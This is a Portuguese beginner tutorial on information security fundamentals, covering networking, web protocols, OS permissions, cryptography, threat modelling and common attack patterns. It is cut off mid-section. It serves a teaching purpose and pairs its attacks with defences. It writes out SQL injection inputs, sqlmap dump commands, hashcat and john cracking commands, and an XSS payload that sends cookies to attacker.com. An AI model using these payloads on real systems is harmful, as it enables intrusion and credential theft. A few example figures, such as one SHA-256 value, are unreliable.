# 🛡️ Fundamentos de Segurança da Informação

## Para Iniciantes em AppSec, Red Team e Cybersecurity

---

## 📚 Índice

1. [Conceitos Básicos de Segurança](#conceitos-básicos)
2. [Fundamentos de Redes e Internet](#redes-e-internet)
3. [Arquitetura Web e Protocolos](#arquitetura-web)
4. [Noções de Sistemas Operacionais](#sistemas-operacionais)
5. [Criptografia e Autenticação](#criptografia-autenticação)
6. [Modelagem de Ameaças](#modelagem-de-ameaças)
7. [Padrões de Ataque](#padrões-de-ataque)
8. [Mentalidade e Aprendizado](#mentalidade)

---

## 1. Conceitos Básicos de Segurança {#conceitos-básicos}

### 📌 Explicação Simples

Segurança da informação é como **proteger um tesouro**:
- **Confidencialidade**: Apenas pessoas autorizadas veem o tesouro
- **Integridade**: O tesouro não é modificado sem permissão
- **Disponibilidade**: O tesouro está sempre acessível quando necessário

### 🔧 Explicação Técnica

A Segurança da Informação baseia-se na **tríade CIA**:

#### **Confidencialidade (C)**
- Proteção contra acesso não autorizado
- Implementado através de criptografia, controle de acesso, autenticação
- Exemplo: Um arquivo criptografado que só o dono pode descriptografar

#### **Integridade (I)**
- Garantia de que os dados não foram alterados
- Implementado através de hashes, assinaturas digitais, checksums
- Exemplo: Um arquivo com checksum SHA-256 que detecta qualquer alteração

#### **Disponibilidade (A)**
- Acesso oportuno aos dados e sistemas
- Implementado através de redundância, failover, disaster recovery
- Exemplo: Um serviço com múltiplos servidores para evitar downtime

#### **Autenticidade (não-repúdio) - 4º pilar**
- Capacidade de provar quem fez uma ação
- Implementado através de assinaturas digitais, logs auditáveis
- Exemplo: Um log que prova quem deletou um arquivo

### 💡 Exemplos Práticos

**Cenário: Sistema de Banco Online**

| Aspecto | Implementação | Ataque |
|---------|---------------|--------|
| **Confidencialidade** | Conexão HTTPS criptografada | Man-in-the-Middle (MitM) sniffing credenciais |
| **Integridade** | Certificado SSL verifica servidor | SQL Injection modifica saldo |
| **Disponibilidade** | Load balancer + redundância | DDoS derruba serviços |
| **Autenticidade** | Logs de auditoria | Usuário nega transação feita |

### ⌨️ Conceitos-Chave

```
Atributo         | Definição                          | Técnica de Proteção
─────────────────┼────────────────────────────────────┼──────────────────────
Confidencialidade │ Dados só vtos por autorizados     │ Criptografia, acesso
Integridade      │ Dados não alterados sem perm.     │ Hash, assinatura digital
Disponibilidade  │ Sempre acessível quando precisa   │ Redundância, backup
Autenticidade    │ Origem/ator confirmável          │ Certificados, logs
─────────────────┴────────────────────────────────────┴──────────────────────
```

---

## 2. Fundamentos de Redes e Internet {#redes-e-internet}

### 📌 Explicação Simples

Uma rede é como um **sistema postal**:
- **Computadores** = Casas
- **Endereço IP** = Endereço postal
- **Porta** = Número do apartamento
- **Protocolo** = Regras de entrega

### 🔧 Explicação Técnica

#### **Modelo OSI - 7 Camadas**

```
Camada 7 │ APLICAÇÃO    │ HTTP, HTTPS, FTP, DNS, SSH, Telnet
Camada 6 │ APRESENTAÇÃO │ Criptografia, compressão, tradução
Camada 5 │ SESSÃO       │ Estabelece/mantém sessões
Camada 4 │ TRANSPORTE   │ TCP, UDP (Porta, Fluxo)
────────┼──────────────┼─────────────────────────────────
Camada 3 │ REDE         │ IP, ICMP (Roteamento, IP)
Camada 2 │ ENLACE       │ Ethernet, WiFi (MAC Address)
Camada 1 │ FÍSICA       │ Cabos, sinais, frequências
```

#### **Comunicação TCP/IP**

**TCP (Transmission Control Protocol) - Confiável**
```
1. SYN       → Cliente solicita conexão
2. SYN-ACK   ← Servidor responde
3. ACK       → Cliente confirma
4. DATA      ↔ Comunicação estabelecida
5. FIN/RST   → Encerramento
```

**UDP (User Datagram Protocol) - Rápido, sem garantia**
```
Envio direto sem handshake
Usado para streaming, DNS, games (latência importante)
```

#### **Endereços e Portas**

**IPv4 vs IPv6**
```
IPv4: 192.168.1.1 (32 bits, 4 octetos) - mais comum
IPv6: 2001:0db8:85a3:0000:0000:8a2e:0370:7334 (128 bits)
```

**Portas Importantes**
```
Porta 80   → HTTP (não criptografado)
Porta 443  → HTTPS (criptografado)
Porta 22   → SSH (shell remoto seguro)
Porta 21   → FTP (transferência de arquivos)
Porta 25   → SMTP (email)
Porta 53   → DNS (resolução de nomes)
Porta 3306 → MySQL (banco de dados)
Porta 5432 → PostgreSQL (banco de dados)
```

### 💡 Exemplos Práticos

**Rastreando uma Requisição HTTP**

```bash
# 1. Resolver nome de domínio (DNS - Porta 53)
dig google.com
# Resposta: 142.251.32.14

# 2. Conectar ao servidor (TCP - Porta 443/HTTPS)
telnet 142.251.32.14 443

# 3. Enviar requisição HTTPS
GET / HTTP/1.1
Host: google.com
```

**Usando Ferramentas de Rede**

```bash
# Ver conexões ativas
netstat -an
ss -tunap  # Versão moderna

# Rastrear rota até servidor
traceroute google.com
mtr google.com

# Verificar IP
ip addr
ifconfig

# Testar conectividade
ping 8.8.8.8  # Google DNS
nmap -p 80,443,22 scanme.nmap.org
```

### 📚 Referências

- [OSI Model - Cisco](https://www.cisco.com/c/en/us/support/docs/security/ios-firewall/23601-156.html)
- [RFC 791 - IPv4](https://tools.ietf.org/html/rfc791)
- [RFC 793 - TCP](https://tools.ietf.org/html/rfc793)

---

## 3. Arquitetura Web e Protocolos {#arquitetura-web}

### 📌 Explicação Simples

Uma aplicação web é um **restaurante online**:
- **Cliente (Browser)** = Você fazendo pedido
- **Servidor (Backend)** = Cozinha processando
- **Banco de Dados** = Estoque de ingredientes
- **HTTP/HTTPS** = Linguagem entre você e o restaurante

### 🔧 Explicação Técnica

#### **Componentes de uma Aplicação Web**

```
┌─────────────────────────────────────────────────────────────┐
│                      CLIENTE (BROWSER)                       │
│  HTML (estrutura) + CSS (estilo) + JavaScript (lógica)      │
└──────────────────────┬──────────────────────────────────────┘
                       │
                    HTTPS/TLS
                       │
┌──────────────────────▼──────────────────────────────────────┐
│                    SERVIDOR WEB (BACKEND)                    │
│  • Processa requisições (GET, POST, PUT, DELETE)            │
│  • Valida dados                                              │
│  • Lógica de negócio                                         │
│  • Autenticação/Autorização                                  │
│  • Rate limiting, logging                                    │
└──────────────────────┬──────────────────────────────────────┘
                       │
                  SQL/API
                       │
┌──────────────────────▼──────────────────────────────────────┐
│                    BANCO DE DADOS                            │
│  • Armazena dados                                            │
│  • Executa queries                                           │
│  • Mantém integridade                                        │
└─────────────────────────────────────────────────────────────┘
```

#### **Métodos HTTP e Semântica**

```
GET    → Recuperar dados (seguro, idempotente)
       Exemplo: GET /api/users/123

POST   → Criar novo recurso
       Exemplo: POST /api/users
       Body: { "name": "João", "email": "joao@email.com" }

PUT    → Substituir recurso inteiro
       Exemplo: PUT /api/users/123
       Body: { "name": "João Silva", "email": "novo@email.com" }

PATCH  → Modificar parcialmente
       Exemplo: PATCH /api/users/123
       Body: { "name": "João Silva" }

DELETE → Remover recurso
       Exemplo: DELETE /api/users/123

OPTIONS → Descreve opções de comunicação
HEAD   → Como GET mas sem body
```

#### **Códigos de Resposta HTTP**

```
2xx - Sucesso
  200 OK              → Requisição bem-sucedida
  201 Created         → Recurso criado
  204 No Content      → Sucesso mas sem resposta

3xx - Redirecionamento
  301 Moved Permanently  → URL mudou permanentemente
  302 Found              → Redirecionamento temporário
  304 Not Modified       → Cache válido

4xx - Erro do Cliente
  400 Bad Request        → Requisição inválida
  401 Unauthorized       → Não autenticado
  403 Forbidden          → Autenticado mas sem permissão
  404 Not Found          → Recurso não existe
  429 Too Many Requests  → Rate limit excedido

5xx - Erro do Servidor
  500 Internal Server Error
  502 Bad Gateway
  503 Service Unavailable
```

#### **Protocolo HTTPS/TLS**

```
HTTPS = HTTP + TLS (Transport Layer Security)

Handshake TLS:
1. Client Hello     → Versão TLS, algoritmos suportados
2. Server Hello     → Certificado, chave pública
3. Key Exchange     → Gera chave de sessão (simétrica)
4. Finished         → Comunicação criptografada inicia
```

### 💡 Exemplos Práticos

**Requisição HTTP Manual com curl**

```bash
# GET simples
curl https://api.github.com/users/github

# POST com dados
curl -X POST https://api.example.com/users \
  -H "Content-Type: application/json" \
  -d '{"name":"João","email":"joao@email.com"}'

# Com autenticação (Bearer token)
curl -H "Authorization: Bearer seu_token_aqui" \
  https://api.example.com/protected

# Ver headers
curl -i https://example.com

# Seguir redirecionamento
curl -L https://example.com/antiga-url
```

**Analisando HTTPS com tcpdump/Wireshark**

```bash
# Capturar tráfego HTTPS (sem descriptografar sem chave privada)
sudo tcpdump -i eth0 -w captura.pcap 'tcp port 443'

# Analisar com Wireshark
wireshark captura.pcap
```

**Testar API com Postman/Thunder Client**

```
1. Abrir Postman
2. Criar nova requisição
3. Selecionar método (GET, POST, etc)
4. Colar URL
5. Adicionar headers se necessário
6. Adicionar body para POST/PUT/PATCH
7. Enviar e verificar resposta
```

### 📚 Referências

- [RFC 7540 - HTTP/2](https://tools.ietf.org/html/rfc7540)
- [RFC 8446 - TLS 1.3](https://tools.ietf.org/html/rfc8446)
- [MDN - HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP)

---

## 4. Noções de Sistemas Operacionais {#sistemas-operacionais}

### 📌 Explicação Simples

Um sistema operacional (SO) é o **gerente da casa**:
- Aloca recursos (memória, processador, disco)
- Controla quem pode acessar o quê
- Gerencia programas/processos
- Protege contra intrusões

### 🔧 Explicação Técnica

#### **Windows vs Linux - Principais Diferenças**

| Aspecto | Windows | Linux |
|---------|---------|-------|
| **Kernel** | Monolítico | Monolítico/Modular |
| **Usuários** | Domain users, Local users | Root, Regular users |
| **Permissões** | NTFS ACLs (RWX) | POSIX (rwx) |
| **Shell** | PowerShell, CMD | Bash, Zsh, Fish |
| **Pacotes** | MSI, EXE | .deb (Debian), .rpm (RedHat) |
| **Serviços** | Services (executados) | Daemons (background) |
| **Firewall** | Windows Defender | iptables, firewalld, ufw |

#### **Permissões de Arquivo**

**Linux (Octal: rwx rwx rwx = 777)**
```
r (read)    = 4  → Ler arquivo/listar diretório
w (write)   = 2  → Escrever/modificar/deletar
x (execute) = 1  → Executar arquivo/acessar diretório

Exemplo: chmod 755 arquivo.sh
7 (user: rwx) 5 (group: r-x) 5 (others: r-x)
```

**Windows (ACLs complexas)**
```
Full Control  → Controle total
Modify        → Ler, escrever, deletar
Read & Execute → Ler e executar
Read          → Apenas ler
Write         → Apenas escrever
```

#### **Processos e Privilégios**

**Windows**
```
Admin/Sistema → Controle total
User          → Permissões restritas

Elevar privilégios: UAC prompt
```

**Linux**
```
root (UID 0) → Controle total
Users (UID 1000+) → Permissões restritas

Elevar: sudo (se configurado em /etc/sudoers)
```

#### **Contas de Serviço Importantes**

**Windows**
```
SYSTEM      → Conta do sistema (máximo privilégio)
LocalService → Serviços com privilégio limitado
NetworkService → Serviços com acesso à rede
Administrator → Conta admin padrão
```

**Linux**
```
root      → ID 0, acesso total
nobody    → Usuário sem privilégios
postgres  → Usuário do banco PostgreSQL
www-data  → Usuário do servidor web
```

### 💡 Exemplos Práticos

**Comandos Essenciais Linux**

```bash
# Gerenciamento de usuários
whoami                    # Usuário atual
id                        # UID, GID, grupos
sudo -l                   # Privilégios sudo disponíveis
sudo su                   # Trocar para root

# Permissões
ls -la                    # Listar com permissões
chmod 755 arquivo         # Mudar permissões (rwxr-xr-x)
chown user:group arquivo  # Mudar proprietário

# Processos
ps aux                    # Listar processos
top                       # Monitoramento em tempo real
kill -9 PID               # Matar processo
netstat -tulpn            # Conexões de rede

# Serviços
systemctl status nginx    # Status do serviço
systemctl start nginx     # Iniciar serviço
systemctl enable nginx    # Ativar na inicialização

# Firewall
sudo ufw status           # Status ufw (Ubuntu)
sudo ufw allow 22         # Permitir SSH
sudo ufw enable           # Ativar firewall
```

**Comandos Essenciais Windows PowerShell**

```powershell
# Informações do sistema
whoami                    # Usuário atual
Get-LocalUser             # Listar usuários
Get-LocalGroupMember Administrators  # Membros admin

# Permissões
Get-Acl C:\arquivo        # Ver ACL
Set-Acl C:\arquivo        # Modificar ACL

# Processos
Get-Process               # Listar processos
Stop-Process -Id 1234     # Matar processo
Get-NetTCPConnection      # Conexões de rede

# Serviços
Get-Service               # Listar serviços
Start-Service ServiceName # Iniciar serviço
Set-Service ServiceName -StartupType Automatic

# Firewall
Get-NetFirewallRule       # Listar regras
New-NetFirewallRule       # Criar regra
Enable-NetFirewallRule    # Habilitar regra
```

**Audit de Segurança Básica**

```bash
# Linux
# Verificar usuários com shell
cat /etc/passwd | grep -v nologin

# Verificar sudoers
sudo cat /etc/sudoers

# Verificar conexões abertas
sudo netstat -tulpn

# Ver logs de autenticação
sudo tail -f /var/log/auth.log
```

```powershell
# Windows
# Ver últimas 50 linhas de eventos de falha de login
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 50

# Listar usuários remotos ativos
quser

# Ver histórico de logon
wevtutil qe Security /q:*[System[(EventID=4688)]]
```

### 📚 Referências

- [Linux Manual Pages](https://linux.die.net/)
- [Microsoft - Windows Security](https://docs.microsoft.com/en-us/windows-server/security/)
- [POSIX Permissions](https://pubs.opengroup.org/onlinepubs/9699919799/)

---

## 5. Criptografia e Autenticação {#criptografia-autenticação}

### 📌 Explicação Simples

Criptografia é como **colocar uma mensagem em uma caixa trancada**:
- Apenas quem tem a chave consegue abrir
- Existem 2 tipos: chave única (simétrica) ou 2 chaves (assimétrica)

Autenticação é **provar sua identidade**:
- Fator único: senha
- Multifator: senha + SMS + aplicativo

### 🔧 Explicação Técnica

#### **Criptografia Simétrica vs Assimétrica**

**SIMÉTRICA (Mesma chave para encriptar/decriptar)**
```
Algoritmos: AES-256, 3DES, ChaCha20

Encriptação:
Texto Original + Chave Secreta = Texto Criptografado
Texto Criptografado + Mesma Chave = Texto Original

Problema: Como compartilhar a chave de forma segura?
```

**ASSIMÉTRICA (2 chaves: pública + privada)**
```
Algoritmos: RSA, ECDSA, EdDSA

Encriptação:
Texto + Chave Pública = Criptografado
Criptografado + Chave Privada = Texto Original

Assinatura Digital:
Mensagem + Chave Privada = Assinatura
Mensagem + Assinatura + Chave Pública = Verificado ✓

Uso: HTTPS, SSH, Certificados Digitais
```

#### **Hashing (Não é Criptografia!)**

```
Função: Texto qualquer → Hash fixo (irreversível)

Exemplos:
SHA-256("password123") = 8d969eef6ecad3c29a3a873fba5f4a2b...
SHA-256("password124") = 9f86d081884c7d6f245c4e5b4c26e6e5...

Mudança mínima = hash completamente diferente

Uso: Senhas, integridade de arquivos, blockchain
```

#### **Métodos de Autenticação**

**Factor Único (Inseguro)**
```
Username + Password
├─ Vulnerável a: Brute force, phishing, reuso de senha
└─ Taxa de sucesso ataque: ~80-90%
```

**Multifator (MFA/2FA)**
```
Algo que você SABE:    Senha, PIN, Resposta segreta
Algo que você TEM:     Telefone (SMS/app), token físico, chave de segurança
Algo que você É:       Biometria (fingerprint, face, iris)
Algo que você FAZ:     Padrão de digitação, comportamento

Exemplos reais:
1. Senha + SMS (2FA)
2. Senha + Google Authenticator (TOTP) (2FA)
3. Senha + Chave FIDO2 (2FA hardware)
4. Senha + Biometria (2FA biométrico)
```

#### **Protocolo OAuth 2.0 / OpenID Connect**

```
Fluxo de Login com Google/GitHub:

1. Usuário clica "Login com Google"
2. Redireciona para accounts.google.com
3. Usuário faz login no Google
4. Google redireciona de volta com código
5. Backend troca código por token (JWT)
6. Usuário autenticado no app

Vantagem: Não armazenar senha no app
```

### 💡 Exemplos Práticos

**Encriptação/Decriptação com OpenSSL**

```bash
# Gerar chave privada RSA 2048
openssl genrsa -out private.key 2048

# Extrair chave pública
openssl rsa -in private.key -pubout -out public.key

# Encriptar arquivo com chave pública
openssl rsautl -encrypt -infile secret.txt -pubin -inkey public.key -out secret.enc

# Decriptar com chave privada
openssl rsautl -decrypt -infile secret.enc -inkey private.key -out secret.txt

# Criar hash SHA-256
echo -n "password123" | sha256sum
echo -n "password123" | openssl dgst -sha256

# Assinar arquivo
openssl dgst -sha256 -sign private.key -out documento.sig documento.txt

# Verificar assinatura
openssl dgst -sha256 -verify public.key -signature documento.sig documento.txt
```

**Testar Força de Senhas**

```bash
# Ferramentas para cracking
hashcat -m 1000 -a 0 hashes.txt wordlist.txt  # Dicionário
hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a # Força bruta
john --wordlist=rockyou.txt hashes.txt        # John the Ripper

# Senhas fracas vs fortes
Fraca:    "password123"      (dicionário comum)
Forte:    "Tr0pic@lPara99#X$" (maiúscula, minúscula, número, especial, 16+ chars)
Melhor:   Passphrase de 4+ palavras aleatórias com números
```

**Implementar Autenticação Segura (JavaScript)**

```javascript
// NUNCA fazer isso:
const password = "admin123";  // Hardcoded!
localStorage.setItem("token", token);  // Não usar localStorage para tokens!

// CORRETO:
// 1. Usar variáveis de ambiente
const API_KEY = process.env.REACT_APP_API_KEY;

// 2. Armazenar token em HttpOnly cookie
// Backend seta: Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Strict

// 3. CSRF Protection
const csrfToken = document.querySelector('meta[name="csrf-token"]').content;
fetch('/api/user', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': csrfToken,
    'Content-Type': 'application/json'
  },
  credentials: 'include',  // Incluir cookies
  body: JSON.stringify(data)
});

// 4. Usar biblioteca de autenticação
import { getAuth, signInWithEmailAndPassword } from "firebase/auth";
```

### 📚 Referências

- [RFC 2104 - HMAC](https://tools.ietf.org/html/rfc2104)
- [RFC 3394 - AES Key Wrap](https://tools.ietf.org/html/rfc3394)
- [NIST SP 800-63B - Authentication and Lifecycle Management](https://pages.nist.gov/800-63-3/sp800-63b.html)

---

## 6. Modelagem de Ameaças {#modelagem-de-ameaças}

### 📌 Explicação Simples

Modelagem de ameaças é como **fazer um mapa de onde ladrões podem entrar em sua casa**:
- Identificar possíveis entradas (janelas, portas)
- Avaliar risco de cada uma
- Colocar trancas nas mais perigosas

### 🔧 Explicação Técnica

#### **STRIDE - Categorias de Ameaça**

```
S - Spoofing of Identity
    └─ Fingir ser alguém/algo que não é
    Exemplo: Servidor falso se dizendo ser legítimo

T - Tampering with Data
    └─ Modificar dados em trânsito ou repouso
    Exemplo: MitM modificando requisição HTTP

R - Repudiation of Actions
    └─ Negar ter feito uma ação
    Exemplo: Usuário nega ter deletado arquivo (sem logs)

I - Information Disclosure
    └─ Exposição de dados confidenciais
    Exemplo: Banco de dados exposto publicamente

D - Denial of Service
    └─ Tornar serviço indisponível
    Exemplo: DDoS derrubando servidor

E - Elevation of Privilege
    └─ Ganhar privilégios não autorizados
    Exemplo: Explorar SQL Injection para acessar dados admin
```

#### **PASTA - Process for Attack Simulation and Threat Analysis**

```
Estágio 1: Definição de Escopo
├─ Qual é o sistema?
├─ Qual é o objetivo do ataque?
└─ Qual é a escala?

Estágio 2: Análise Técnica
├─ Diagramas de arquitetura
├─ Fluxos de dados
└─ Componentes críticos

Estágio 3: Análise de Ameaças
├─ Possíveis atacantes
├─ Motivações
└─ Capacidades

Estágio 4: Análise de Vulnerabilidades
├─ Falhas de código
├─ Configurações inseguras
└─ Controles faltantes

Estágio 5: Análise de Impacto
├─ Qual é o dano?
├─ Afeta quantos usuários?
└─ Impacto financeiro?

Estágio 6: Recomendação de Controles
├─ Preventivos (evitar ataque)
├─ Detectivos (identificar ataque)
└─ Corretivos (recuperar de ataque)

Estágio 7: Priorização de Ameaças
├─ Matriz: Probabilidade x Impacto
└─ Ordem de remediação
```

#### **LINDDUN - Ameaças de Privacidade**

```
L - Linkability
    └─ Conectar ações/transações do mesmo usuário
    Exemplo: Rastrear usuário por cookies/IPs

I - Identifiability
    └─ Identificar usuário de forma única
    Exemplo: Email único exposto = identidade

N - Non-repudiation
    └─ Não poder negar ação (ameaça de privacidade!)
    Exemplo: Log que prova ação do usuário

D - Detectability
    └─ Detectar se evento ocorreu
    Exemplo: Verificar se usuário acessou página X

U - Unawareness
    └─ Usuário não sabe que foi coletado dado
    Exemplo: Pixel de rastreamento invisível

N - Non-compliance
    └─ Não estar em compliance com leis
    Exemplo: Não seguir GDPR/LGPD
```

### 💡 Exemplos Práticos

**Modelar Ameaças - Aplicação de E-commerce**

```
Aplicação: Sistema de Carrinho de Compras

1. COMPONENTES:
   ├─ Browser (Cliente)
   ├─ Servidor Web
   ├─ Banco de Dados
   └─ API de Pagamento (3º)

2. FLUXO DE DADO:
   Usuário → [HTTPS] → Servidor → [SQL] → BD
                              ↓
                         API de Pagamento

3. STRIDE POR COMPONENTE:

   BROWSER:
   - Tampering: XSS injetar JS malicioso
   - Spoofing: CSRF fazer compra falsa
   - Disclosure: Sessionid em localStorage (JavaScript access)

   SERVIDOR WEB:
   - Tampering: SQL Injection
   - Elevation: Vulnerabilidade RCE
   - Denial: DDoS

   BANCO DE DADOS:
   - Disclosure: Credentials vazadas
   - Tampering: Dados modificados (sem integridade)

   API PAGAMENTO:
   - Spoofing: MitM interceptar chamada
   - Tampering: Modificar valor da transação

4. MATRIZ DE RISCO:
   ┌───────────────────┬────────┬────────┬────────┐
   │ Ameaça            │ Prob.  │ Impacto│ Risco  │
   ├───────────────────┼────────┼────────┼────────┤
   │ SQL Injection     │ Alta   │ Crítico│ CRÍTICO│
   │ XSS               │ Alta   │ Alto   │ ALTO   │
   │ CSRF              │ Média  │ Médio  │ MÉDIO  │
   │ DDoS              │ Baixa  │ Crítico│ MÉDIO  │
   │ MitM API Payment  │ Baixa  │ Crítico│ MÉDIO  │
   └───────────────────┴────────┴────────┴────────┘

5. CONTROLES (por ordem):
   CRÍTICO:
   ├─ Prepared Statements (evita SQL Injection)
   ├─ CSP Headers + Sanitize (evita XSS)
   ├─ HTTPS + Certificado válido (evita MitM)
   └─ WAF / IDS (detecta ataques)

   ALTO:
   ├─ CSRF tokens
   ├─ Rate limiting (reduz impacto DDoS)
   └─ Logging e alertas
```

**Criar Diagrama de Ameaça (Ferramenta: Microsoft Threat Modeling Tool)**

```
1. Instalar: https://www.microsoft.com/en-us/securityengineering/...
2. Criar novo projeto
3. Adicionar elementos:
   - External Entity (usuário, atacante)
   - Process (função, API)
   - Data Store (BD, cache)
   - Data Flow (comunicação entre elementos)
4. Tool gera ameaças automaticamente STRIDE
5. Revisar, priorizar, mitigar
```

### 📚 Referências

- [STRIDE Model - Microsoft](https://docs.microsoft.com/en-us/windows-hardware/drivers/driversecurity/threat-modeling)
- [PASTA - OWASP](https://owasp.org/www-community/Threat_Model)
- [LINDDUN Privacy - KU Leuven](https://linddun.org/)

---

## 7. Padrões de Ataque {#padrões-de-ataque}

### 📌 Explicação Simples

Padrões de ataque são **técnicas conhecidas usadas por hackers**.
Conhecer padrões ajuda a:
- Identificar ataques em progresso
- Implementar defesas corretas
- Detectar anomalias

### 🔧 Explicação Técnica

#### **Cyber Kill Chain (Lockheed Martin)**

```
FASE 1: RECONNAISSANCE
├─ Atividade: Coletar informações sobre alvo
├─ Técnicas: OSINT, varredura de rede, engenharia social
├─ Indicadores: DNS lookups, conexões de scan
└─ Defesa: Monitorar atividade anormal

FASE 2: WEAPONIZATION
├─ Atividade: Criar payload/malware
├─ Técnicas: Exploit, trojan, phishing doc
├─ Indicadores: Arquivo suspeito criado
└─ Defesa: Antivírus, signature-based detection

FASE 3: DELIVERY
├─ Atividade: Entregar weapon ao alvo
├─ Técnicas: Email, USB, download, watering hole
├─ Indicadores: Email suspeito, tráfego anormal
└─ Defesa: Email filter, WAF, IDS

FASE 4: EXPLOITATION
├─ Atividade: Explorar vulnerabilidade
├─ Técnicas: Buffer overflow, code injection, RCE
├─ Indicadores: Erro/crash da aplicação, acesso inusitado
└─ Defesa: Patches, WAF, SIEM

FASE 5: INSTALLATION
├─ Atividade: Instalar persistência (backdoor)
├─ Técnicas: Rootkit, webshell, cron job, registry mod
├─ Indicadores: Novo usuário, processo desconhecido
└─ Defesa: Filesystem monitoring, HIDS

FASE 6: COMMAND & CONTROL (C2)
├─ Atividade: Estabelecer canal com controlador
├─ Técnicas: HTTP, DNS tunneling, P2P
├─ Indicadores: Conexão outbound suspeita, tráfego criptografado anormal
└─ Defesa: Network monitoring, IDS, proxy

FASE 7: ACTIONS ON OBJECTIVES
├─ Atividade: Alcançar objetivo (roubar dados, sabotar)
├─ Técnicas: Exfiltração, lateral movement, destruição
├─ Indicadores: Grande volume de dados saindo, acesso a arquivos críticos
└─ Defesa: DLP, auditoria, detecção comportamental
```

#### **MITRE ATT&CK - Táticas e Técnicas Reais**

```
Matriz Simplificada (Seleção de técnicas):

RECONNAISSANCE
├─ Gather Victim Org Info
├─ Gather Victim Identity Info
└─ Search Open Websites/Domains (OSINT)

INITIAL ACCESS
├─ Phishing
├─ Exploit Public-Facing Application
└─ Supply Chain Compromise

EXECUTION
├─ User Execution
├─ Command and Scripting Interpreter
└─ Scheduled Task/Job

PERSISTENCE
├─ Account Manipulation
├─ Create Account
└─ Modify Registry

PRIVILEGE ESCALATION
├─ Abuse Elevation Control Mechanism
├─ Exploitation for Privilege Escalation
└─ Token Impersonation/Theft

DEFENSE EVASION
├─ Masquerading
├─ Obfuscated Files or Information
└─ Disable or Modify System Firewall

CREDENTIAL ACCESS
├─ Brute Force
├─ Credential Dumping
└─ Input Capture (Keylogger)

DISCOVERY
├─ Account Discovery
├─ System Information Discovery
└─ Network Share Discovery

LATERAL MOVEMENT
├─ Pass the Hash
├─ Pass the Ticket
└─ Exploitation of Remote Services

COLLECTION
├─ Data Staged
├─ Email Collection
└─ Screen Capture

EXFILTRATION
├─ Exfiltration Over C2 Channel
├─ Exfiltration Over Alternative Protocol
└─ Data Encrypted for Exfiltration

COMMAND & CONTROL
├─ Application Layer Protocol (HTTP, DNS)
├─ Encrypted Channel
└─ Proxy

IMPACT
├─ Data Destruction
├─ Data Encrypted for Impact (Ransomware)
└─ Service Stop
```

#### **Vetores de Ataque Comuns**

**1. Injeção (Injection)**
```
SQL Injection:
Input: ' OR '1'='1
Query gerado: SELECT * FROM users WHERE id = '' OR '1'='1'
Resultado: Todos os usuários expostos

Defesa:
├─ Prepared Statements
├─ Parameterized Queries
└─ Input Validation
```

**2. XSS (Cross-Site Scripting)**
```
Stored XSS:
Usuário injeta: <script>alert('hacked')</script>
Stored no BD: comentário com script
Outros usuários: script executado no navegador deles

Defesa:
├─ HTML Encoding/Escaping
├─ Content Security Policy (CSP)
└─ DOMPurify / Sanitization
```

**3. CSRF (Cross-Site Request Forgery)**
```
Cenário:
1. Usuário logado em bank.com
2. Acessa website-malicioso.com
3. Site malicioso faz: <img src="bank.com/transfer?to=attacker&amount=1000">
4. Navegador envia cookie de bank.com
5. Transferência feita sem consentimento!

Defesa:
├─ CSRF Tokens (único por sessão)
├─ SameSite Cookie Flag
└─ Double Submit Cookies
```

**4. Authentication Bypass**
```
Exemplo 1: Credentials Hardcoded
if (username == "admin" && password == "admin123") {
    // Login OK (PÉSSIMO!)
}

Exemplo 2: Session Fixation
attacker.com redireciona para bank.com?sessionid=attacker_controlled
Se app não regenera sessionid, attacker hijack session

Exemplo 3: JWT sem verificação
Token = eyJ...
App não verifica assinatura, qualquer um pode forjar

Defesa:
├─ Bcrypt/Argon2 for senha
├─ Regenerate Session ID
├─ JWT com Secret forte
└─ MFA
```

**5. Broken Access Control**
```
Cenário: /api/users/123/profile
Usuário 1 acessa /api/users/2/profile (outro usuário)
Sem validação: Acesso concedido!

Defesa:
├─ Validar ownership
├─ RBAC/ABAC
├─ Audit access
└─ Testing (IDOR automated scan)
```

### 💡 Exemplos Práticos

**Exemplo Completo: SQL Injection**

```
Aplicação vulnerável:
```python
query = "SELECT * FROM users WHERE email = '" + email + "'"
db.execute(query)
```

Ataque:
```
Input: ' OR '1'='1' --
Query fica: SELECT * FROM users WHERE email = '' OR '1'='1' -- '
Resultado: Retorna TODOS os usuários!

Ataque avançado (UNION):
Input: ' UNION SELECT version() --
Query fica: SELECT * FROM users WHERE email = '' UNION SELECT version() --
Resultado: Versão do BD exposto
```

Exploit automatizado:
```bash
# SQLMap - teste automatizado
sqlmap -u "http://app.com/search?q=" --dbs
sqlmap -u "http://app.com/search?q=" -D db_name --tables
sqlmap -u "http://app.com/search?q=" -D db_name -T users --dump
```

Defesa Correta:
```python
# 1. Prepared Statement
query = "SELECT * FROM users WHERE email = ?"
db.execute(query, [email])

# 2. ORM (Safer)
user = User.where('email', email).first()

# 3. Input Validation
if not is_valid_email(email):
    raise ValueError("Invalid email")
```

**Exemplo: XSS Attack & Defesa**

```javascript
// VULNERÁVEL
function displayComment(comment) {
  document.getElementById('comments').innerHTML = comment;
  // Usuário injeta: <img src=x onerror="fetch('attacker.com/steal?cookie='+document.cookie)">
  // Seu cookie é enviado para atacante!
}

// SEGURO - Opção 1: Encode
function displayComment(comment) {
  document.getElementById('comments').textContent = comment;
  // textContent é seguro, não executa HTML
}

// SEGURO - Opção 2: Sanitize
import DOMPurify from 'dompurify';
function displayComment(comment) {
  const clean = DOMPurify.sanitize(comment);
  document.getElementById('comments').innerHTML = clean;
}

// SEGURO - Opção 3: CSP Header (Backend)
// Header: Content-Security-Policy: default-src 'self'; script-src 'self'
// Bloqueia scripts inline e de terceiros
```

### 📚 Referências

- [Lockheed Martin Cyber Kill Chain](https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-kill-chain.html)
- [MITRE ATT&CK Framework](https://attack.mitre.org/)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

## 8. Mentalidade e Aprendizado {#mentalidade}

### 📌 Explicação Simples

Aprender segurança ofensiva (hacking) é como **aprender a consertar carros**:
- Estude o manual (documentação)
- Pratique com carros seguros (labs controlados)
- Entenda como quebra (vulnerabilidades)
- Depois, conserte corretamente (defesa)

### 🔧 Mentalidade Ofensiva vs Defensiva

**MINDSET DEFENSIVO**
```
"Como posso proteger este sistema?"
├─ Pensamento: Prevenção, detecção, resposta
├─ Foco: Mitigar riscos conhecidos
├─ Ferramentas: Firewalls, antivírus, SIEM, WAF
